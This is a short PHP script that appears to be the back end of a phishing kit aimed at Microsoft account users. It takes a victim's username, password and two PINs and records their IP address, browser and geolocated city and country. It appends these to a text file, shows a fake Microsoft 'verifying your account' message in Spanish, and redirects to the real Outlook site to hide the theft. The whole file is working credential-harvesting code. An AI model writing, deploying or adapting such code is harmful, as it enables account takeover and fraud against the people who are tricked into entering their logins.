<?php

session_start();

$username =$_SESSION['username'];
$password =$_SESSION['password'];
$pin = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$ipaddress = $_SERVER['REMOTE_ADDR'];
$timestamp = date('d/m/Y');
$timeshour = date('h:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];

$ipdat = @json_decode(file_get_contents( 
    "http://www.geoplugin.net/json.gp?ip=" . $ipaddress)); 

$file = fopen("kike.txt", "a") or die("some error occured"); //open file, create if doesn't exist
$txt = "\nUsuario: $username | Clave: $password : [$pin] : [$pin2]\nFecha: $timestamp | Hora: $timeshour |  Direccion IP: $ipaddress | Pais: $ipdat->geoplugin_countryName | Ciudad: $ipdat->geoplugin_city\n -------------- Datos de la Cuenta (Arriba) --------------\n"; //store data as username password
fwrite($file, $txt); //write to our file
fclose($file); //close the file handle

echo '
<html>
<head>
<meta http-equiv="refresh" content="2;URL=https://outlook.live.com/owa/">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style type="text/css">
.cbalink{
display: none;
}
</style>
</head>
<body>Verificando su cuenta de Microsoft, esto puede demorar unos minutos. Por favor espere...</body>
</html>';

			exit();
			
			
			session_destroy();